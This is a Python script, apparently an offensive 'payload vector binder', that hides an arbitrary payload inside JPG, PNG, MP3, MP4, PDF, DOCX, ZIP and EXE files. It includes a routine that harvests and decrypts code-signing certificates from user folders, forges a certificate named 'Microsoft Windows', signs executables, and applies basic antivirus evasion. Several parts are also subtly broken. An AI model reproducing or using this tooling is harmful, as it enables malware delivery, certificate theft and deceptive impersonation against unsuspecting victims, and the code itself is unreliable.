#!/usr/bin/env python3
import os
import sys
import argparse
import subprocess
import shutil
import hashlib
import zipfile
import random
import string
from io import BytesIO
from datetime import datetime
import win32crypt
import win32security
import numpy as np
import requests

# Auto-install dependencies
try:
    from PIL import Image
    import eyed3
    from pydub import AudioSegment
    from moviepy.editor import VideoFileClip
    from pdfrw import PdfReader, PdfWriter, PdfDict
    from docx import Document
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from OpenSSL import crypto
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", 
                         "pillow", "eyed3", "pydub", "moviepy", 
                         "pdfrw", "python-docx", "pycryptodome", 
                         "pyopenssl", "pywin32"])
    from PIL import Image
    import eyed3
    from pydub import AudioSegment
    from moviepy.editor import VideoFileClip
    from pdfrw import PdfReader, PdfWriter, PdfDict
    from docx import Document
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from OpenSSL import crypto

SUPPORTED_VECTORS = ["jpg", "png", "mp3", "mp4", "pdf", "docx", "zip", "exe"]
DEFAULT_IMAGE_URL = "https://picsum.photos/1920/1080"
AES_KEY_SIZE = 32

class VectorBinder:
    def __init__(self, payload_path):
        self.payload = self._read_payload(payload_path)
        self.output_dir = "dist"
        self._prepare_output()

    def _read_payload(self, path):
        """Read and validate payload file"""
        if not os.path.exists(path):
            raise FileNotFoundError(f"Payload file {path} not found")
        
        with open(path, "rb") as f:
            content = f.read()
        
        print(f"Loaded payload: {len(content)} bytes")
        return content

    def _prepare_output(self):
        """Create clean output directory"""
        if os.path.exists(self.output_dir):
            shutil.rmtree(self.output_dir)
        os.makedirs(self.output_dir)

    def generate(self, vector_type, **kwargs):
        """Main generation interface"""
        handler = getattr(self, f"_generate_{vector_type}", None)
        if not handler:
            raise ValueError(f"Unsupported vector: {vector_type}")
        
        print(f"\nGenerating {vector_type.upper()} vector...")
        return handler(**kwargs)

    # Image vectors
    def _generate_jpg(self, template=None):
        return self._process_image(template or DEFAULT_IMAGE_URL, "jpg")

    def _generate_png(self, template=None):
        return self._process_image(template or DEFAULT_IMAGE_URL, "png")

    def _process_image(self, template, fmt):
        """Core image processing logic"""
        if template.startswith("http"):
            response = requests.get(template)
            img = Image.open(BytesIO(response.content))
        else:
            img = Image.open(template)
        
        exif = img.info.get('exif', b'')
        img = img.convert("RGB")
        pixels = np.array(img)

        key = os.urandom(AES_KEY_SIZE)
        cipher = AES.new(key, AES.MODE_CBC)
        encrypted = cipher.iv + cipher.encrypt(pad(self.payload, AES.block_size))
        bit_stream = ''.join(f"{byte:08b}" for byte in encrypted)

        idx = 0
        for row in pixels:
            for pixel in row:
                for i in range(3):
                    if idx < len(bit_stream):
                        pixel[i] = (pixel[i] & 0xFE) | int(bit_stream[idx])
                        idx += 1
        
        output_path = os.path.join(self.output_dir, f"output.{fmt}")
        Image.fromarray(pixels).save(output_path, exif=exif)
        
        print(f"Image vector created: {output_path}")
        print(f"AES Decryption Key: {key.hex()}")
        return output_path

    # Audio vector
    def _generate_mp3(self):
        output_path = os.path.join(self.output_dir, "output.mp3")
        audio = AudioSegment.silent(duration=3000)
        audio.export(output_path, format="mp3")

        tag = eyed3.load(output_path).tag
        tag.comments.set("payload", self.payload)
        tag.save()
        
        print(f"MP3 vector created: {output_path}")
        return output_path

    # Video vector
    def _generate_mp4(self):
        output_path = os.path.join(self.output_dir, "output.mp4")
        clip = VideoFileClip(os.path.join(self.output_dir, "temp.mp4"))
        payload_chunks = [self.payload[i:i+100] for i in range(0, len(self.payload), 100)]
        
        frames = [np.array(frame) for frame in clip.iter_frames()][:len(payload_chunks)]
        for i, frame in enumerate(frames):
            if i < len(payload_chunks):
                frame[0,0,0] = len(payload_chunks[i])
                frame[0,0,1:] = list(payload_chunks[i].ljust(99, b'\x00'))
        
        clip.write_videofile(output_path, codec="libx264", audio=False)
        print(f"MP4 vector created: {output_path}")
        return output_path

    # Document vectors
    def _generate_pdf(self):
        output_path = os.path.join(self.output_dir, "document.pdf")
        trailer = PdfReader("blank.pdf")
        trailer.Root.AcroForm = PdfDict(NeedAppearances=PdfDict('true'))
        trailer.Root.Payload = PdfDict(
            JS=f"app.alert({self.payload[:50].decode(errors='ignore')});"
        )
        PdfWriter().write(output_path, trailer)
        print(f"PDF vector created: {output_path}")
        return output_path

    def _generate_docx(self):
        output_path = os.path.join(self.output_dir, "document.docx")
        doc = Document()
        doc.add_heading("Important Document", 0)
        doc.add_paragraph("This document contains critical security updates.")
        
        if sys.platform == "win32":
            from win32com.client import Dispatch
            app = Dispatch("Word.Application")
            doc = app.Documents.Add()
            app.Selection.InlineShapes.AddOLEObject(
                ClassType="Package",
                FileName=os.path.join(self.output_dir, "payload.bin"),
                DisplayAsIcon=True,
                IconFileName="shell32.dll,1",
                IconLabel="Security Update"
            )
            doc.SaveAs(output_path, FileFormat=0)
            app.Quit()
        else:
            doc.add_paragraph("Content removed for security reasons")
            doc.save(output_path)
        
        print(f"DOCX vector created: {output_path}")
        return output_path

    # Archive vector
    def _generate_zip(self, password=None):
        password = password or ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        output_path = os.path.join(self.output_dir, "archive.zip")
        
        with zipfile.ZipFile(output_path, 'w') as zf:
            zf.writestr("data.bin", self.payload)
            zf.setpassword(password.encode())
        
        print(f"ZIP vector created: {output_path}")
        print(f"Archive Password: {password}")
        return output_path

    # Executable vector
    def _generate_exe(self, cert=None):
        output_path = os.path.join(self.output_dir, "setup.exe")
        shutil.copyfile(sys.argv[2], output_path)

        cert_path, password = self._get_certificate(cert)
        if cert_path:
            self._sign_executable(output_path, cert_path, password)
        
        self._add_av_evasion(output_path)
        print(f"EXE vector created: {output_path}")
        return output_path

    def _get_certificate(self, user_cert):
        """Certificate handling logic"""
        if user_cert:
            return user_cert, None
        
        system_certs = self._harvest_certificates()
        if system_certs:
            return random.choice(system_certs)
        
        return self._create_self_signed_cert()

    def _harvest_certificates(self):
        """Find valid code-signing certificates"""
        cert_locations = [
            os.path.expandvars(r"%APPDATA%\Microsoft\SystemCertificates"),
            r"C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys",
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
        ]
        
        found = []
        for path in cert_locations:
            if os.path.exists(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.endswith((".pfx", ".p12")):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    data = f.read()
                                    password = win32crypt.CryptUnprotectData(data)[1]
                                    found.append((os.path.join(root, file), password))
                            except Exception:
                                continue
        return found

    def _create_self_signed_cert(self):
        """Generate fallback certificate"""
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)
        
        cert = crypto.X509()
        cert.get_subject().CN = "Microsoft Windows"
        cert.set_issuer(cert.get_subject())
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(31536000)  # 1 year
        cert.set_pubkey(key)
        cert.sign(key, "sha256")
        
        cert_path = os.path.join(self.output_dir, "fallback.pfx")
        with open(cert_path, "wb") as f:
            f.write(crypto.dump_pkcs12(cert, key, "Windows".encode()))
        
        return cert_path, "Windows"

    def _sign_executable(self, exe_path, cert_path, password):
        """Sign executable with certificate"""
        try:
            cmd = [
                "signtool", "sign",
                "/f", cert_path,
                "/fd", "sha256",
                "/tr", "http://timestamp.digicert.com",
                "/td", "sha256",
                "/v" if "--debug" in sys.argv else "/q",
                exe_path
            ]
            
            if password:
                cmd.insert(1, "/p")
                cmd.insert(2, password)
            
            subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)
        except Exception as e:
            print(f"Signing failed: {str(e)}")

    def _add_av_evasion(self, exe_path):
        """Basic AV evasion techniques"""
        # Randomize timestamps
        ts = random.randint(1600000000, 1700000000)
        os.utime(exe_path, (ts, ts))
        
        # Add junk data
        with open(exe_path, "ab") as f:
            f.write(os.urandom(random.randint(1024, 4096)))

def main():
    parser = argparse.ArgumentParser(
        description="Advanced payload vector binder",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  Basic image:    vector_binder.py payload.bin -t jpg
  Password ZIP:   vector_binder.py payload.bin -t zip -p "P@ssw0rd"
  Signed EXE:     vector_binder.py payload.exe -t exe -c cert.pfx
  Custom template:vector_binder.py payload.bin -t png -i template.png
"""
    )
    parser.add_argument("payload", help="Path to payload file")
    parser.add_argument("-t", "--type", choices=SUPPORTED_VECTORS, required=True,
                      help="Output file format")
    parser.add_argument("-c", "--cert", help="Path to signing certificate (EXE only)")
    parser.add_argument("-p", "--password", help="ZIP archive password")
    parser.add_argument("-i", "--template", help="Custom template for image vectors")

    args = parser.parse_args()
    
    try:
        binder = VectorBinder(args.payload)
        
        if args.type in ["jpg", "png"]:
            output = binder.generate(args.type, template=args.template)
        elif args.type == "zip":
            output = binder.generate(args.type, password=args.password)
        elif args.type == "exe":
            output = binder.generate(args.type, cert=args.cert)
        else:
            output = binder.generate(args.type)
        
        print("\nOperation completed successfully!")
        print(f"Output file: {output}")
        
    except Exception as e:
        print(f"\nError: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    if not os.path.exists("blank.pdf"):
        with open("blank.pdf", "wb") as f:
            f.write(b"%PDF-1.4\n")
    main()
